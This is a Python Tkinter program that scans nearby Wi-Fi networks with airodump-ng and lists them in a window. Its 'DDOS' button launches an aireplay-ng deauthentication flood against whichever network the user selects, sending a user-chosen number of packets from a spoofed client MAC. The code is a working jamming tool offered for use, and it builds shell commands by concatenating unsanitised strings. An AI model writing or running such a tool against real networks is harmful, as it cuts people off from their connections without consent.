from tkinter import *
import os

class app:
	def __init__(self,master):
		master.minsize(width=300, height=1000)
		master.maxsize(width=300, height=1000)
		os.system("rm qwer*")
		os.system("/usr/bin/timeout --foreground --signal=SIGINT 5 airodump-ng mon0 -w qwer")
		
		cc=0
		def read_file():
			cc=0
			f = open('qwer-01.csv',"r")
			line = f.readlines()
			a=[[]]*len(line)
			for i in range(len(line)):
				if line[i].split(',')[0]=="Station MAC":
					cc=i-1
					#print(cc)
					break
				a[i] = line[i].split(',')
			f.close()
			return a,cc

		def reset():
			for i in range(2,cc):
				c[i].destroy()
			pw.destroy()
			pb.destroy()
			pc.destroy()
			dd.destroy()
			s.destroy()
			time_l.destroy()
			e1.destroy()
			bssid = ""
			channel = ""
			#print("aa")
			ap=app(root)
		
		def print_name():
			for i in range(cc):
				if var[i].get()==1:
					print(a[i][13].lstrip())
					break
		def print_bssid():
			for i in range(cc):
				if var[i].get()==1:
					print(a[i][0].lstrip())
					break
		def print_channel():
			for i in range(cc):
				if var[i].get()==1:
					print(a[i][3].lstrip())
					break

		def ddos():
			#os.system("timeout --signal=SIGINT 5 airodump-ng wlan0mon -w aaaaaa.csv")
			for i in range(cc):
				if var[i].get()==1:
					bssid=a[i][0]
					channel=a[i][3]
					break
			os.system("airmon-ng start wlan0mon "+channel)
			print("aireplay-ng --deauth 1000 -h '1c:39:47:25:33:cc' -a '"+bssid+"'")
			os.system("aireplay-ng --deauth "+ e1.get() +" -h 'E0:94:67:69:C6:E3' -a '"+bssid+"' wlan0mon")
			reset()

		a,cc=read_file()
		l=Label(root, text = "Choose a WIFI Network : ", font = ('times',15)).grid(row=0, sticky = W)
		var = [IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar(),IntVar]
		#print(cc)
		c=[None]*cc
		for i in range(2,cc):
			c[i]=Checkbutton(root, text=a[i][13].upper(), variable = var[i], font = ('times',13))
			c[i].grid(row=i+1, sticky=W)
		i=i+1		
		pw=Button(root, text = "Print Name", font = ('times', 20), command = print_name)
		pw.grid(row=i+2, sticky=W)
		pb=Button(root, text = "Print BSSID", font = ('times', 20), command = print_bssid)
		pb.grid(row=i+3, sticky=W)
		pc=Button(root, text = "Print Channel", font = ('times', 20), command = print_channel)
		pc.grid(row=i+4, sticky=W)
		dd=Button(root, text = "DDOS", font = ('times', 20), command = ddos)
		dd.grid(row=i+5, sticky=W)
		s=Button(root, text = "Scan", font = ('times', 20), command = reset)
		s.grid(row=i+6, sticky=W)

		time_l = Label(root, font = ('times', 20), text = "Enter time")
		time_l.grid(row=i+7, sticky=W)

		e1 = Entry(master)

		e1.grid(row=i+8, column = 0, sticky='we')


root = Tk()
ap = app(root)
root.mainloop()
